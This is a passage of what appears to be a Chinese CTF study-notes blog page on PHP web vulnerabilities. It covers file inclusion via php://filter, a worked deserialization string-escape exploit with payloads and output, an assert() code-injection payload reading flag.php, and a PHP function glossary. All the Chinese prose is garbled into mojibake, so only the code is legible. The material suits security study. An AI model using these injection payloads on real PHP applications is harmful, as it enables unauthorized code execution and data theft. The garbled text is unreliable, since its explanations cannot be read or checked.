original_file_name.file_type.swp#ç»ˆç«¯è¾“å…¥æ­¤å‘½ä»¤å¯ä»¥æŸ¥çœ‹æ–‡ä»¶</span><br><span class="line">:w file_name.file_type#Vimä¸­è¾“å…¥æ­¤å‘½ä»¤å¯ä»¥ä¿å­˜æ–‡ä»¶åˆ°ç»ˆç«¯è¿è¡Œç›®å½•</span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´"></a><big>æ–‡ä»¶åŒ…å«æ¼æ´</big></h2><p align="right"><small>ç‰¹å¾ï¼šxxx.php/?file=xxx</small></p><p>include()å‡½æ•°ï¼šæ£€ç´¢æ–‡ä»¶ä¸­çš„phpä»£ç ï¼Œè‹¥å­˜åœ¨ï¼Œåˆ™æ‰§è¡Œï¼›åä¹‹åˆ™è¾“å‡ºåŸæ–‡ã€‚åŸæœ¬ç”¨äºä¼˜åŒ–ä»£ç çš„é‡ç”¨æ€§ï¼Œä½†å…¶ç‰¹æ€§ä½¿å¾—è¿™ä¸ªå‡½æ•°å°±æ˜¯é€ æˆæ¼æ´çš„æ ¹æœ¬</p><ul><li>phpä¼ªåè®®ï¼ˆå°è£…åè®®ï¼‰ï¼š<ul><li>php://ï¼šå¯ä»¥è®¿é—®å„ç§I/Oæµï¼Œå¦‚php://inputå¸¸ç”¨äºfile_get_contents(php://input)ï¼Œè¿™æ ·å°±å¯ä»¥è¯»å…¥ç”¨æˆ·çš„è¾“å…¥æµã€‚å¦‚æœç›´æ¥ä½¿ç”¨<code>?file=wanted.php</code>ä¼šè¢«è§£æï¼Œä½†æƒ³è¦æŸ¥çœ‹æºç ï¼Œåˆ™å¯ä»¥ç”¨<code>?file=php://filter/convert.base64-encode/resource=wanted.php</code>ï¼Œå¯ä»¥å¾—åˆ°å…¶b64ç¼–ç åçš„æºç ï¼Œè¿™æ ·php://filterå°±ä½œä¸ºä¸­é—´æµï¼ŒæŠŠæºç è½¬b64ï¼Œinclude()æ— æ³•æ‰§è¡Œï¼Œäºæ˜¯ç›´æ¥è¾“å‡ºb64ç¼–ç åçš„æºç </li><li>file://ï¼šå¯ä»¥è®¿é—®æœ¬åœ°æ–‡ä»¶ï¼Œåæ¥ç›®å½•å³å¯</li><li>è¿˜æœ‰å¦‚zip://ï¼Œdata://ç­‰åè®®ï¼Œä½†ç›®å‰æ²¡æœ‰åšåˆ°æœ‰éœ€è¦çš„é¢˜ç›®</li></ul></li><li>æ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å«ï¼šå½“ç”¨æˆ·å¯ä»¥ä¸Šä¼ æ–‡ä»¶ä¸”æ–‡ä»¶ç›®å½•å¯çŸ¥ï¼ŒåŒæ—¶è¿˜å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œåˆ™ç”¨æˆ·å¯ä»¥é€šè¿‡ä¸Šä¼ ä»»æ„åŒ…å«äº†ä¸€å¥è¯æœ¨é©¬çš„æ–‡ä»¶æ‰”ç»™include()æ¥è§£æ</li></ul><h2 id="ååºåˆ—åŒ–é€ƒé€¸"><a href="#ååºåˆ—åŒ–é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–é€ƒé€¸"></a><big>ååºåˆ—åŒ–é€ƒé€¸</big></h2><p>ç”¨æˆ·è¾“å…¥è¦ä¼ è¾“åˆ°æœåŠ¡å™¨ï¼Œå¸¸éœ€è¦è¿‡æ»¤ä¸åºåˆ—åŒ–ï¼Œä½†å½“è¿‡æ»¤æ­¥éª¤æ”¾åœ¨åºåˆ—åŒ–ä¹‹åï¼Œåˆ™å¯èƒ½å› ä¸ºå­—ç¬¦ä¸²é€ƒé€¸è€Œé€ æˆå¯¹è±¡æ³¨å…¥</p><ul><li><p>åŸç†ï¼šè¿‡æ»¤å‡½æ•°é€ æˆäº†åºåˆ—åŒ–è¿”å›çš„å­—ç¬¦ä¸²å†…å®¹å‡å°‘æˆ–å¢åŠ çš„ç°è±¡ï¼Œä½†æ²¡æœ‰ä¿®æ”¹æ•°æ®é•¿åº¦çš„æ ‡è®°ï¼ˆå¦‚ â€œphpâ€è¢«æ›¿æ¢ä¸º â€œNONONOâ€ï¼›æˆ– â€œWHEREâ€è¢«æ›¿æ¢ä¸º â€œMARKâ€ï¼‰ï¼Œåˆååºåˆ—åŒ–é€šè¿‡è¯†åˆ« â€œ;}â€œé—­åˆï¼Œåé¢å†—ä½™çš„å†…å®¹ä¼šè¢«ä¸¢å¼ƒ</p></li><li><p>å…·ä½“çš„æ”»å‡»å½¢å¼</p><ul><li><p>åœ¨æ­¤å¯ä»¥å…ˆç¡®è®¤éœ€è¦æ„é€ çš„å¯¹è±¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Key</span>=<span class="string">&quot;onlyAdminKnow&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Key=<span class="variable">$Key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> User(<span class="string">&#x27;guest&#x27;</span>,<span class="keyword">new</span> Admin(<span class="string">&#x27;hack&#x27;</span>)));</span><br></pre></td></tr></table></figure></li></ul><blockquote>#[Out] // åŸæœ¬æ— æ¢è¡Œç¬¦ä¸ä»»ä½•ç©ºæ ¼ï¼Œä¸ºäº†å¯è¯»æ€§è€Œæ‰‹åŠ¨æ·»åŠ <br>O:4:"User":2:{<br>&emsp;s:8:"username";s:5:"guest";<br>&emsp;s:6:"passwd";O:5:"Admin":1:{<br>&emsp;&emsp;s:3:"Key";s:4:"hack";<br>&emsp;}<br>}</blockquote>  </li><li><p>ç¡®å®šäº†éœ€è¦æ„é€ çš„å¯¹è±¡å³ä¸ºä¸Šæ–‡ä¸­çš„è¾“å‡º</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æ­¤å¤„ç”¨æˆ·åªèƒ½æ§åˆ¶Userç±»ä¸­çš„$usernameä¸$passwd</span></span><br><span class="line"><span class="comment">#å´å¯ä»¥é€šè¿‡é€ƒé€¸ä¿®æ”¹Adminç±»ä¸­çš„$Key</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Key</span>=<span class="string">&quot;onlyAdminKnow&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Key=<span class="variable">$Key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;Key,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterLess</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s</span>=str_replace(<span class="string">&#x27;FLAG&#x27;</span>,<span class="string">&#x27;NO&#x27;</span>,<span class="variable">$s</span>);<span class="comment">#å‡å°‘2ä¸ªå­—ç¬¦</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterMore</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s</span>=str_replace(<span class="string">&#x27;FLAG&#x27;</span>,<span class="string">&#x27;_JESUS_&#x27;</span>,<span class="variable">$s</span>);<span class="comment">#å¢åŠ 3ä¸ªå­—ç¬¦</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># BASIC:â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$iusername</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$ipasswd</span>=<span class="string">&#x27;guestpass&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span>=serialize(<span class="keyword">new</span> User(<span class="variable">$iusername</span>,<span class="variable">$ipasswd</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>,<span class="string">&quot;\n&quot;</span>;<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;guest&quot;;s:6:&quot;passwd&quot;;s:9:&quot;guestpass&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">HACK:</span>â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span>=<span class="string">&#x27;&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">#è¿™å°±æ˜¯å¸Œæœ›æ³¨å…¥çš„å†…å®¹ï¼Œä¿®æ”¹Adminç±»ä¸­çš„$Keyä¸ºhack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># LESS:â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;======LESS START======&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#æ€æƒ³åœ¨äºï¼šæ ‡è®°é•¿åº¦ä¸å˜çš„æƒ…å†µä¸‹æ•°æ®å‡å°‘äº†</span></span><br><span class="line">    <span class="comment">#ä¹Ÿå°±æ˜¯è¯´ä¼šæœ‰ä¸å‡å°‘é‡ç›¸ç­‰çš„å­—ç¬¦æ•°é‡è¢«åå¹¶ä¸ºå˜é‡çš„value</span></span><br><span class="line">    <span class="variable">$dataEatenByLess</span>=<span class="string">&#x27;&quot;;s:6:&quot;passwd&quot;;s:41:&quot;&#x27;</span>;</span><br><span class="line">    <span class="comment">#å¸Œæœ›è¢«filterLessåƒæ‰çš„å­—ç¬¦ä¸²å¦‚ä¸Š</span></span><br><span class="line">    <span class="keyword">echo</span> strlen(<span class="variable">$dataEatenByLess</span>),<span class="string">&quot;\n&quot;</span>;<span class="comment">//21</span></span><br><span class="line">    <span class="comment">#æ¯ä¸ªFLAGå2å­—ç¬¦ï¼Œåœ¨passwdè¡¥ä¸€ä½å‡‘3çš„å€æ•°</span></span><br><span class="line">    <span class="comment">#11ä¸ªFLAGåå®Œï¼Œåå®Œåè¦æ”¹ä»€ä¹ˆå˜é‡å°±éšå¿ƒæ‰€æ¬²äº†</span></span><br><span class="line">    <span class="variable">$payloadPasswd</span>=<span class="string">&#x27;0&#x27;</span>.<span class="variable">$target</span>;</span><br><span class="line">    <span class="variable">$payloadLess</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">11</span>;<span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$payloadLess</span>.=<span class="string">&#x27;FLAG&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span>=serialize(<span class="keyword">new</span> User(<span class="variable">$payloadLess</span>,<span class="variable">$payloadPasswd</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>,<span class="string">&quot;\n&quot;</span>;<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:44:&quot;FLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAG&quot;;s:6:&quot;passwd&quot;;s:54:&quot;0&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;&quot;;&#125;</span></span><br><span class="line">    unserialize(filterLess(<span class="variable">$data</span>));<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:44:&quot;NONONONONONONONONONONO&quot;;s:6:&quot;passwd&quot;;s:54:&quot;0&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;&quot;;&#125;</span></span><br><span class="line">    <span class="comment">//hack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MORE:â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;======MORE START======&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#æ€æƒ³åœ¨äºï¼šæ ‡è®°é•¿åº¦ä¸å˜çš„æƒ…å†µä¸‹æ•°æ®å¢åŠ äº†</span></span><br><span class="line">    <span class="comment">#è®¡ç®—å¥½éœ€è¦é€ƒé€¸çš„é‡ï¼Œä½¿å…¶åˆšå¥½ä¸å¢åŠ é‡ç›¸ç­‰ï¼Œè¿™äº›å­—ç¬¦å°±è·‘åˆ°å˜é‡çš„valueä¹‹å¤–äº†</span></span><br><span class="line">    <span class="keyword">echo</span> strlen(<span class="variable">$target</span>),<span class="string">&quot;\n&quot;</span>;<span class="comment">//53</span></span><br><span class="line">    <span class="comment">#æ¯ä¸ªFLAGæº¢å‡º3ä¸ªå­—ç¬¦ï¼Œéœ€è¦é€ƒé€¸53ä¸ªå­—ç¬¦</span></span><br><span class="line">    <span class="comment">#åœ¨é€ƒé€¸å­—ç¬¦é—­åˆåé¢åŠ ä¸Šä»»æ„ä¸€ä¸ªå­—ç¬¦å‡‘æˆ3çš„å€æ•°ï¼Œ18ä¸ªFLAGè¾¾åˆ°æº¢å‡ºé‡</span></span><br><span class="line">    <span class="variable">$dataOverflow</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">18</span>;<span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$dataOverflow</span>.=<span class="string">&#x27;FLAG&#x27;</span>;</span><br><span class="line">    <span class="variable">$dataOverflow</span>.=<span class="variable">$target</span>.<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span>=serialize(<span class="keyword">new</span> User(<span class="variable">$dataOverflow</span>,<span class="string">&#x27;anything&#x27;</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>,<span class="string">&quot;\n&quot;</span>;<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:126:&quot;FLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAG&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;0&quot;;s:6:&quot;passwd&quot;;s:8:&quot;anything&quot;;&#125;</span></span><br><span class="line">    unserialize(filterMore(<span class="variable">$data</span>));<span class="comment">//&#123;s:8:&quot;username&quot;;s:126:&quot;_JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS_&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;0&quot;;s:6:&quot;passwd&quot;;s:8:&quot;anything&quot;;&#125;</span></span><br><span class="line">    <span class="comment">//hack</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="PHPå¤ªæ€ªäº†"><a href="#PHPå¤ªæ€ªäº†" class="headerlink" title="PHPå¤ªæ€ªäº†"></a>PHPå¤ªæ€ªäº†</h2><h3 id="å˜é‡å¥—å˜é‡"><a href="#å˜é‡å¥—å˜é‡" class="headerlink" title="å˜é‡å¥—å˜é‡"></a>å˜é‡å¥—å˜é‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$hello</span>=<span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$a</span>;<span class="comment">//è¾“å‡º world</span></span><br></pre></td></tr></table></figure><h3 id="å˜é‡å¥—å‡½æ•°"><a href="#å˜é‡å¥—å‡½æ•°" class="headerlink" title="å˜é‡å¥—å‡½æ•°"></a>å˜é‡å¥—å‡½æ•°</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showstr</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">showstr();</span><br><span class="line"><span class="comment">//æ­£å¸¸çš„è°ƒç”¨æ–¹æ³•</span></span><br><span class="line"><span class="variable">$action</span> = <span class="string">&quot;showstr&quot;</span>;</span><br><span class="line"><span class="variable">$action</span>();<span class="comment">//å®é™…è°ƒç”¨äº†showstr()å‡½æ•°</span></span><br></pre></td></tr></table></figure><hr><h1 id="PHP-func-DICT"><a href="#PHP-func-DICT" class="headerlink" title="PHP func DICT"></a><big><center>PHP <i>func</i> DICT</center></big></h1><p><code>error_reporting(0)</code>    # å…³é—­é”™è¯¯æŠ¥å‘Š</p><p><code>print()</code>/<code>print_r()</code>/<code>echo</code>    # echoæ›´åƒæ˜¯å¦‚ ifï¼Œwhileè¿™æ ·çš„è¯­è¨€ç»“æ„ï¼Œæ²¡æœ‰è¿”å›å€¼ï¼Œä¸”å¯ä»¥ç›´æ¥æ‰“å°å¤šä¸ªå˜é‡ï¼›print()ä¸ print_r()æ˜¯å‡½æ•°ï¼Œå­˜åœ¨è¿”å›å€¼ trueï¼›å…¶ä¸­ print_r()ç›¸æ¯” print()å¯ä»¥ä¼ å…¥çš„å˜é‡èŒƒå›´æ›´å¤§ï¼Œæ•°ç»„ä¹Ÿå¯ä»¥ç”¨ print_r()æ‰“å°å‡ºæ¥</p><p><code>var_dump($var)</code>    # å±•ç¤º$varçš„valueä¸type</p><p><code>eval($str)</code>    # æ‰§è¡Œå‚æ•°ä¸­åŒ…å«çš„PHPä»£ç </p><p><code>assert($str)</code>    # æ–­è¨€ï¼Œå¯ä»¥çœ‹ä½œå¼‚å¸¸å¤„ç†çš„ä¸€ç§é«˜çº§å½¢å¼ï¼Œç”¨äºè°ƒè¯•ä»£ç ï¼Œé‡ç‚¹åœ¨äºassertå‡½æ•°ä¼šå°†ä¼ å…¥çš„ strç±»å‹å‚æ•°å…¨éƒ¨å½“æˆ PHPä»£ç æ‰§è¡Œï¼Œä¸ evalç±»ä¼¼ã€‚ä½†æ ¹æ®æµ‹è¯•ï¼Œassertçš„ä»£ç ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œä¹Ÿä¸èƒ½è¾“å…¥å¤šä¸ªè¯­å¥</p><ul><li><p>assertçš„é—­åˆ // ç†è®ºä¸Šå¦‚æ­¤ï¼Œå¾…æµ‹è¯•</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//POSTï¼šmyString=&#x27;&#x27;) or print_r(file_get_content(flag.php));#</span></span><br><span class="line">assert(<span class="variable">$_POST</span>[<span class="string">&#x27;myString&#x27;</span>]) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;holyShit&quot;</span>);</span><br><span class="line"><span class="comment">//æœ€ç»ˆä¼šæ‰§è¡Œçš„æ˜¯ï¼š</span></span><br><span class="line">assert(<span class="string">&#x27;&#x27;</span>) <span class="keyword">or</span> print_r(file_get_content(flag.php));<span class="comment">#) or die(&quot;holyShit&quot;);</span></span><br></pre></td></tr></table></figure></li></ul><p><code>scandir($str)</code>    # æ‰«ææŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œè¿”å›å€¼ä¸ºæ–‡ä»¶åç»„æˆçš„æ•°ç»„</p><p><code>die(str)</code>ä¸<code>exit(str)</code>    # é€€å‡ºå½“å‰è„šæœ¬å¹¶å¼¹å‡º statusçŠ¶æ€æè¿°ï¼Œå…¶ä¸­æ¯”è¾ƒæœ‰è¶£çš„æ˜¯or die()è¿™ç§ç»„åˆã€‚å›  PHPå¹¶ä¸åŒºåˆ†æ•°æ®ç±»å‹ï¼Œæ‰€ä»¥$fileæ—¢å¯ä»¥æ˜¯intä¹Ÿå¯ä»¥boolï¼Œæ‰€ä»¥è¿™æ ·çš„è¯­å¥ä¸ä¼šæŠ¥é”™ï¼Œåœ¨å¤§å¤šæ•°çš„è¯­è¨€ä¸­ï¼Œbool or boolè¿™æ ·çš„è¯­å¥ä¸­ï¼Œè‹¥å‰ä¸€ä¸ªå€¼ä¸ºçœŸåä¸€ä¸ªå€¼å°±ä¸å†åˆ¤æ–­äº†ã€‚ä¾‹å¦‚ä¸‹åˆ—ä»£ç ï¼Œå¦‚æœ fopenå‡½æ•°æ‰§è¡Œæ­£ç¡®çš„è¯ï¼Œä¼šè¿”å›ä¸€ä¸ªå¤§äº0çš„intå€¼ï¼ˆæ–‡ä»¶æŒ‡é’ˆèµ„æºï¼Œè¿™å…¶å®å°±æ˜¯trueï¼‰ï¼Œåé¢çš„è¯­å¥å°±ä¸ä¼šæ‰§è¡Œäº†ï¼Œè€Œå¤±è´¥æ—¶è¿”å›false</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;æŠ±æ­‰ï¼Œæ— æ³•æ‰“å¼€: <span class="subst">$filename</span>&quot;</span>);</span><br><span class="line"><span class="literal">true</span> <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no1&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no.1 passed&quot;</span>;</span><br><span class="line"><span class="literal">false</span> <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no2&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no.2 passed&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote>[Out]<br>no.1 passed<br>no2</blockquote><p><code>system(shell command)</code>    # æ‰§è¡Œshellå‘½ä»¤</p><p><code>file_get_contents($stream)</code>    # å°†æ•°æ®æµè¯»å…¥å­—ç¬¦ä¸²ï¼Œè‹¥php://inputä½œä¸ºå‚æ•°ï¼Œå°±å¯ä»¥å°†ç”¨æˆ·è¾“å…¥è¯»æˆå­—ç¬¦ä¸²</p><p><code>file($stream)</code>    # å°†æ•°æ®æµè¯»å…¥æ•°ç»„ï¼Œæ¯è¡Œä½œä¸€ä¸ªå…ƒç´ </p><p><code>highlight_file($filename,$return)</code>    # å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®è¾“å‡ºï¼Œ$returnå‚æ•°å¯é€‰ï¼Œé»˜è®¤ä¸ºfalseï¼›å½“ä¸ºtrueæ—¶è¿”å›å­—ç¬¦ä¸²è€Œä¸è¾“å‡º</p><p><code>extract($array)</code>    # è¾“å…¥ä¸€ä¸ªæ•°ç»„ï¼Œå°†æ•°ç»„ä¸­çš„å…ƒç´ è§£æåˆ°å¯¹åº”çš„å˜é‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;Horse&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=extract(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span 